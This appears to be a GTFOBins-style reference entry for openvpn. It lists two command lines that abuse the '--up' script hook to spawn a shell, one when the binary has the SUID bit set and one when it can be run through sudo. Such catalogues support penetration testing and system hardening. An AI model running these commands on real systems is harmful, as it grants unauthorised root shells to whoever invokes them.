---
functions:
  suid:
    - code: |
        ./openvpn --dev tun0 --script-security 2 --up '/bin/sh -p -c "sh -p"'
  sudo:
    - code: |
        COMMAND='id'
        sudo openvpn --dev tun0 --script-security 2 --up '/bin/sh -c sh'
---
